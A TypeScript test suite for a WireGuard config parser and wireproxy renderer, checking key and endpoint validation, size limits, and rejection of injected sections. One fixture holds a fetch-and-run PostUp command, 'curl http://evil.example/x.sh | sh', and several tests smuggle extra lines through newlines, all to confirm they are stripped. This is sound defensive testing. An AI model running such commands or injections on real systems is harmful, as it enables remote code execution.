import assert from "node:assert/strict";
import { test } from "node:test";

// Pure: no database, no process, no network.
const cfg = await import("../../../src/lib/wireguard/egressConfig.ts");

const key = (fill: number) => Buffer.alloc(32, fill).toString("base64");
const PRIV = key(0x11);
const PUB = key(0x22);
const PSK = key(0x33);

const MULLVAD = `[Interface]
# Device: Test Otter
PrivateKey = ${PRIV}
Address = 10.66.66.2/32,fc00:bbbb:bbbb:bb01::3:4a3c/128
DNS = 10.64.0.1

[Peer]
PublicKey = ${PUB}
AllowedIPs = 0.0.0.0/0,::0/0
Endpoint = 185.213.154.68:51820
`;

const WARP = `[Interface]
PrivateKey = ${PRIV}
Address = 172.16.0.2/32
Address = 2606:4700:110:8a36:df92:102a:9602:fa0f/128
DNS = 1.1.1.1, 1.0.0.1
MTU = 1280

[Peer]
PublicKey = ${PUB}
AllowedIPs = 0.0.0.0/0
AllowedIPs = ::/0
Endpoint = engage.cloudflareclient.com:2408
`;

function parse(text: string) {
  return cfg.parseWireGuardEgressConfig(text);
}

function withPeerLine(line: string, base = MULLVAD) {
  return base.replace(/Endpoint = .*\n/, `${line}\n`);
}

test("key validator: exactly 32 canonical base64 bytes", () => {
  assert.equal(cfg.isWireGuardKeyText(PRIV), true);
  const bad = [
    "",
    "short",
    PRIV.slice(0, -1),
    `${PRIV}A`,
    PRIV.replace("=", "A"), // 44 chars, no padding: not a 32-byte key
    "A".repeat(43) + "B", // no padding
    Buffer.alloc(32, 0).toString("base64"), // the all-zero key is never valid
    Buffer.alloc(33, 1).toString("base64"),
    `${PRIV.slice(0, 20)}!${PRIV.slice(21)}`,
    `${PRIV.slice(0, 43)}=\n`,
    null,
    undefined,
    42,
  ];
  for (const value of bad) assert.equal(cfg.isWireGuardKeyText(value), false, String(value));
  // Non-canonical padding bits: the last data character carries two spare bits that must be zero.
  assert.equal(PRIV.at(-2), "E");
  assert.equal(cfg.isWireGuardKeyText(`${PRIV.slice(0, 42)}F=`), false);
});

test("valid Mullvad-style config parses into a normalised model", () => {
  const result = parse(MULLVAD);
  assert.equal(result.ok, true, result.errors.join("|"));
  assert.deepEqual(result.errors, []);
  const model = result.model!;
  assert.equal(model.privateKey, PRIV);
  assert.deepEqual(model.addresses, ["10.66.66.2/32", "fc00:bbbb:bbbb:bb01::3:4a3c/128"]);
  assert.deepEqual(model.dns, ["10.64.0.1"]);
  assert.equal(model.mtu, null);
  assert.equal(model.peer.publicKey, PUB);
  assert.equal(model.peer.presharedKey, null);
  assert.equal(model.peer.endpointHost, "185.213.154.68");
  assert.equal(model.peer.endpointPort, 51820);
  assert.deepEqual(model.peer.allowedIps, ["0.0.0.0/0", "::0/0"]);
  assert.equal(model.peer.persistentKeepalive, null);
  assert.deepEqual(result.ignored, []);
  // ::0/0 is a default route, so there is no "not a full tunnel" warning.
  assert.ok(!result.warnings.some((w) => w.includes("full tunnel")));
});

test("valid WARP-style config: repeated Address/AllowedIPs, hostname endpoint, MTU, two resolvers", () => {
  const result = parse(WARP);
  assert.equal(result.ok, true, result.errors.join("|"));
  const model = result.model!;
  assert.deepEqual(model.addresses, [
    "172.16.0.2/32",
    "2606:4700:110:8a36:df92:102a:9602:fa0f/128",
  ]);
  assert.deepEqual(model.dns, ["1.1.1.1", "1.0.0.1"]);
  assert.equal(model.mtu, 1280);
  assert.equal(model.peer.endpointHost, "engage.cloudflareclient.com");
  assert.equal(model.peer.endpointPort, 2408);
  assert.deepEqual(model.peer.allowedIps, ["0.0.0.0/0", "::/0"]);
});

test("CRLF files, a BOM, comments, key case and a preshared key are accepted", () => {
  const text =
    `﻿${MULLVAD.replace("[Peer]", `[peer] # the server\npresharedkey = ${PSK}\npersistentkeepalive=15`)}`
      .replace(/\n/g, "\r\n")
      .replace("[Interface]", "[interface]")
      .replace("PrivateKey", "privatekey");
  const result = parse(text);
  assert.equal(result.ok, true, result.errors.join("|"));
  assert.equal(result.model!.peer.presharedKey, PSK);
  assert.equal(result.model!.peer.persistentKeepalive, 15);
});

test("PostUp/PostDown/PreUp/PreDown/SaveConfig/Table/FwMark are dropped and reported by key only", () => {
  const secretCommand = "curl http://evil.example/x.sh | sh #";
  const text = MULLVAD.replace(
    "DNS = 10.64.0.1",
    [
      "DNS = 10.64.0.1",
      `PostUp = ${secretCommand}`,
      "PostDown = iptables -D FORWARD -i %i -j ACCEPT",
      "PreUp = echo hi",
      "PreDown = echo bye",
      "SaveConfig = true",
      "Table = off",
      "FwMark = 0xca6c",
      "ListenPort = 51820",
      "MysterySetting = 1",
    ].join("\n")
  );
  const result = parse(text);
  assert.equal(result.ok, true, result.errors.join("|"));
  assert.deepEqual(result.ignored.map((entry) => entry.key).sort(), [
    "FwMark",
    "ListenPort",
    "MysterySetting",
    "PostDown",
    "PostUp",
    "PreDown",
    "PreUp",
    "SaveConfig",
    "Table",
  ]);
  for (const entry of result.ignored) {
    assert.ok(entry.line > 0);
    assert.ok(!JSON.stringify(entry).includes("evil.example"), "values are never echoed");
  }
  // And none of it reaches the rendered config.
  const rendered = cfg.renderWireproxyConfig(result.model!, { socksPort: 40001 });
  for (const word of [
    "PostUp",
    "PostDown",
    "iptables",
    "evil",
    "Table",
    "FwMark",
    "ListenPort",
    "curl",
  ]) {
    assert.ok(!rendered.includes(word), word);
  }
});

test("a non-full-tunnel AllowedIPs is accepted with a warning and rendered as a full tunnel", () => {
  const result = parse(MULLVAD.replace("0.0.0.0/0,::0/0", "10.0.0.0/8"));
  assert.equal(result.ok, true);
  assert.ok(result.warnings.some((w) => w.includes("full tunnel")));
  const rendered = cfg.renderWireproxyConfig(result.model!, { socksPort: 40001 });
  assert.match(rendered, /AllowedIPs = 0\.0\.0\.0\/0, ::\/0\n/);
  assert.ok(!rendered.includes("10.0.0.0/8"));
});

test("DNS search domains are ignored with a warning; a missing DNS warns", () => {
  const withDomain = parse(MULLVAD.replace("DNS = 10.64.0.1", "DNS = 10.64.0.1, corp.example"));
  assert.equal(withDomain.ok, true);
  assert.deepEqual(withDomain.model!.dns, ["10.64.0.1"]);
  assert.ok(withDomain.warnings.some((w) => w.includes("DNS")));
  const noDns = parse(MULLVAD.replace("DNS = 10.64.0.1\n", ""));
  assert.equal(noDns.ok, true);
  assert.ok(noDns.warnings.some((w) => w.includes("No DNS")));
});

test("rejects: multiple peers, missing sections, extra/unknown sections, malformed lines", () => {
  const extraPeer = `${MULLVAD}\n[Peer]\nPublicKey = ${key(0x44)}\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n`;
  const table: Array<[string, string, RegExp]> = [
    ["multiple peers", extraPeer, /exactly one \[Peer\]/],
    ["no peer", MULLVAD.split("[Peer]")[0], /Missing \[Peer\]/],
    ["no interface", `[Peer]${MULLVAD.split("[Peer]")[1]}`, /Missing \[Interface\]/],
    [
      "two interfaces",
      `${MULLVAD}\n[Interface]\nPrivateKey = ${PRIV}\nAddress = 10.0.0.1/32\n`,
      /only one \[Interface\]/,
    ],
    [
      "socks section smuggled in",
      `${MULLVAD}\n[Socks5]\nBindAddress = 0.0.0.0:1080\n`,
      /unsupported section/,
    ],
    [
      "tcp tunnel section",
      `${MULLVAD}\n[TCPClientTunnel]\nBindAddress = 0.0.0.0:22\n`,
      /unsupported section/,
    ],
    ["setting outside a section", `PrivateKey = ${PRIV}\n${MULLVAD}`, /outside a section/],
    ["line without equals", MULLVAD.replace("DNS = 10.64.0.1", "DNS 10.64.0.1"), /Key = Value/],
    ["unterminated header", MULLVAD.replace("[Peer]", "[Peer"), /malformed section header/],
    [
      "duplicate private key",
      MULLVAD.replace("DNS = 10.64.0.1", `DNS = 10.64.0.1\nPrivateKey = ${PRIV}`),
      /more than once/,
    ],
    ["empty", "", /empty/],
    ["only whitespace", "  \n \n", /empty/],
  ];
  for (const [label, text, pattern] of table) {
    const result = parse(text);
    assert.equal(result.ok, false, label);
    assert.equal(result.model, undefined, label);
    assert.ok(
      result.errors.some((e) => pattern.test(e)),
      `${label}: ${result.errors.join("|")}`
    );
  }
  assert.equal(cfg.parseWireGuardEgressConfig(undefined).ok, false);
  assert.equal(cfg.parseWireGuardEgressConfig(42 as never).ok, false);
});

test("rejects bad keys, addresses, MTU and keepalive without echoing the value", () => {
  const junk = "SUPER-SECRET-LOOKING-VALUE";
  const cases: Array<[string, string]> = [
    ["PrivateKey", MULLVAD.replace(PRIV, junk)],
    ["PrivateKey", MULLVAD.replace(PRIV, PRIV.slice(0, -2))],
    ["PublicKey", MULLVAD.replace(PUB, junk)],
    ["PresharedKey", MULLVAD.replace("[Peer]", `[Peer]\nPresharedKey = ${junk}`)],
    ["Address", MULLVAD.replace("10.66.66.2/32", `${junk}/32`)],
    ["Address", MULLVAD.replace("10.66.66.2/32", "10.66.66.2/33")],
    ["Address", MULLVAD.replace("10.66.66.2/32", "999.1.1.1/32")],
    ["Address", MULLVAD.replace("10.66.66.2/32", "fe80::1%eth0/64")],
    ["MTU", MULLVAD.replace("DNS = 10.64.0.1", "DNS = 10.64.0.1\nMTU = 12")],
    ["MTU", MULLVAD.replace("DNS = 10.64.0.1", "DNS = 10.64.0.1\nMTU = 99999")],
    ["PersistentKeepalive", MULLVAD.replace("[Peer]", "[Peer]\nPersistentKeepalive = soon")],
    ["AllowedIPs", MULLVAD.replace("0.0.0.0/0,::0/0", "0.0.0.0/99")],
  ];
  for (const [key, text] of cases) {
    const result = parse(text);
    assert.equal(result.ok, false, `${key}: ${text.slice(0, 80)}`);
    assert.ok(
      result.errors.some((e) => e.includes(key)),
      `${key}: ${result.errors.join("|")}`
    );
    assert.ok(!JSON.stringify(result).includes(junk), "no input echoed in errors");
    assert.ok(!JSON.stringify(result).includes(PRIV), "no key echoed in errors");
  }
  // Missing required fields.
  assert.ok(
    parse(MULLVAD.replace(/PrivateKey = .*\n/, "")).errors.some((e) => e.includes("PrivateKey"))
  );
  assert.ok(parse(MULLVAD.replace(/Address = .*\n/, "")).errors.some((e) => e.includes("Address")));
  assert.ok(
    parse(MULLVAD.replace(/PublicKey = .*\n/, "")).errors.some((e) => e.includes("PublicKey"))
  );
  assert.ok(
    parse(MULLVAD.replace(/Endpoint = .*\n/, "")).errors.some((e) => e.includes("Endpoint"))
  );
});

test("endpoint validation: host or IP plus a 1-65535 port, no scheme or junk", () => {
  const ok: Array<[string, string, number]> = [
    ["1.2.3.4:51820", "1.2.3.4", 51820],
    ["vpn.example.com:1", "vpn.example.com", 1],
    ["se-got-wg-001.relays.mullvad.net:65535", "se-got-wg-001.relays.mullvad.net", 65535],
    ["[2001:db8::1]:51820", "2001:db8::1", 51820],
    ["vpn:51820", "vpn", 51820],
  ];
  for (const [text, host, port] of ok) {
    assert.deepEqual(cfg.parseWgEndpoint(text), { host, port }, text);
    const result = parse(withPeerLine(`Endpoint = ${text}`));
    assert.equal(result.ok, true, `${text}: ${result.errors.join("|")}`);
  }
  const bad = [
    "",
    "1.2.3.4",
    "1.2.3.4:0",
    "1.2.3.4:65536",
    "1.2.3.4:-1",
    "1.2.3.4:abc",
    "1.2.3.4:",
    ":51820",
    "https://vpn.example.com:51820",
    "wg://vpn.example.com:51820",
    "vpn.example.com/path:51820",
    "user@vpn.example.com:51820",
    "vpn example.com:51820",
    "2001:db8::1:51820", // bare IPv6 needs brackets
    "[2001:db8::1]51820",
    "[1.2.3.4]:51820",
    "999.1.1.1:51820",
    "-bad.example.com:51820",
    "bad-.example.com:51820",
    "bad_name.example.com:51820",
    "a..b.com:51820",
    `${"a".repeat(64)}.com:51820`,
    "fe80::1%eth0:51820",
  ];
  for (const text of bad) {
    assert.equal(cfg.parseWgEndpoint(text), null, JSON.stringify(text));
    if (text.trim()) {
      assert.equal(parse(withPeerLine(`Endpoint = ${text}`)).ok, false, JSON.stringify(text));
    }
  }
});

test("size limit: 16 KB is accepted, one byte more is refused", () => {
  const pad = (bytes: number) => `# ${"x".repeat(bytes - 3)}\n`;
  const base = Buffer.byteLength(MULLVAD, "utf8");
  const atLimit = MULLVAD + pad(cfg.MAX_WG_CONFIG_BYTES - base);
  assert.equal(Buffer.byteLength(atLimit, "utf8"), cfg.MAX_WG_CONFIG_BYTES);
  assert.equal(parse(atLimit).ok, true);
  const over = `${atLimit}#`;
  const result = parse(over);
  assert.equal(result.ok, false);
  assert.ok(result.errors[0].includes("16 KB"));
  // Multi-byte characters count as bytes, not characters.
  const wide = MULLVAD + `# ${"é".repeat(cfg.MAX_WG_CONFIG_BYTES / 2)}\n`;
  assert.equal(parse(wide).ok, false);
});

test("control characters and CRLF injection are rejected before parsing", () => {
  const bad = [
    MULLVAD.replace("10.64.0.1", "10.64.0.1\u0000"),
    MULLVAD.replace("10.64.0.1", "10.64.0.1\u001b[2J"),
    MULLVAD.replace("10.64.0.1", "10.64.0.1\rPostUp = x"), // lone CR
    MULLVAD.replace("10.64.0.1", "10.64.0.1\u007f"),
    MULLVAD.replace("10.64.0.1", "10.64.0.1\u0008"),
  ];
  for (const text of bad) {
    const result = parse(text);
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("control characters")));
  }
  // A CRLF that tries to smuggle a new section into a value becomes a real line and is refused.
  const smuggle = MULLVAD.replace(
    "Endpoint = 185.213.154.68:51820",
    "Endpoint = 185.213.154.68:51820\r\n[Socks5]\r\nBindAddress = 0.0.0.0:1080"
  );
  const result = parse(smuggle);
  assert.equal(result.ok, false);
  assert.ok(result.errors.some((e) => e.includes("unsupported section")));
  // Tabs are fine.
  assert.equal(parse(MULLVAD.replace("Address = ", "Address =\t")).ok, true);
});

test("wireproxy rendering: exact text, loopback bind only", () => {
  const parsed = parse(MULLVAD);
  const rendered = cfg.renderWireproxyConfig(parsed.model!, { socksPort: 41234 });
  assert.equal(
    rendered,
    [
      "[Interface]",
      `PrivateKey = ${PRIV}`,
      "Address = 10.66.66.2/32, fc00:bbbb:bbbb:bb01::3:4a3c/128",
      "DNS = 10.64.0.1",
      "",
      "[Peer]",
      `PublicKey = ${PUB}`,
      "Endpoint = 185.213.154.68:51820",
      "AllowedIPs = 0.0.0.0/0, ::/0",
      "PersistentKeepalive = 25",
      "",
      "[Socks5]",
      "BindAddress = 127.0.0.1:41234",
      "",
    ].join("\n")
  );
  assert.ok(!rendered.includes("0.0.0.0:"), "never binds all interfaces");

  const warp = cfg.renderWireproxyConfig(
    {
      ...parse(WARP).model!,
      peer: { ...parse(WARP).model!.peer, presharedKey: PSK, persistentKeepalive: 0 },
    },
    { socksPort: 40000, socksUsername: "rr0123456789ab", socksPassword: "Pw_-9" }
  );
  assert.equal(
    warp,
    [
      "[Interface]",
      `PrivateKey = ${PRIV}`,
      "Address = 172.16.0.2/32, 2606:4700:110:8a36:df92:102a:9602:fa0f/128",
      "DNS = 1.1.1.1, 1.0.0.1",
      "MTU = 1280",
      "",
      "[Peer]",
      `PublicKey = ${PUB}`,
      `PresharedKey = ${PSK}`,
      "Endpoint = engage.cloudflareclient.com:2408",
      "AllowedIPs = 0.0.0.0/0, ::/0",
      "",
      "[Socks5]",
      "BindAddress = 127.0.0.1:40000",
      "Username = rr0123456789ab",
      "Password = Pw_-9",
      "",
    ].join("\n")
  );

  const v6 = cfg.renderWireproxyConfig(
    parse(withPeerLine("Endpoint = [2001:db8::1]:51820")).model!,
    {
      socksPort: 40000,
    }
  );
  assert.match(v6, /Endpoint = \[2001:db8::1\]:51820\n/);
});

test("rendering refuses bad ports, half credentials, and hand-built hostile models", () => {
  const model = parse(MULLVAD).model!;
  for (const port of [0, -1, 65536, 1.5, Number.NaN]) {
    assert.throws(() => cfg.renderWireproxyConfig(model, { socksPort: port }), /port/i);
  }
  assert.throws(
    () => cfg.renderWireproxyConfig(model, { socksPort: 4000, socksUsername: "u" }),
    /together/
  );
  assert.throws(
    () =>
      cfg.renderWireproxyConfig(model, {
        socksPort: 4000,
        socksUsername: "u\nx",
        socksPassword: "p",
      }),
    /credentials/
  );
  const hostile = (patch: Record<string, unknown>, peer: Record<string, unknown> = {}) =>
    ({ ...model, ...patch, peer: { ...model.peer, ...peer } }) as never;
  for (const bad of [
    hostile({ privateKey: `${PRIV}\n[Socks5]` }),
    hostile({}, { endpointHost: "a.example.com\nBindAddress = 0.0.0.0:1" }),
    hostile({ addresses: ["10.0.0.1/32\nPostUp = x"] }),
    hostile({ dns: ["1.1.1.1\nPostUp = x"] }),
    hostile({ mtu: 12 }),
    hostile({}, { presharedKey: "not-a-key" }),
    hostile({}, { persistentKeepalive: -5 }),
  ]) {
    assert.throws(() => cfg.renderWireproxyConfig(bad, { socksPort: 4000 }));
  }
});
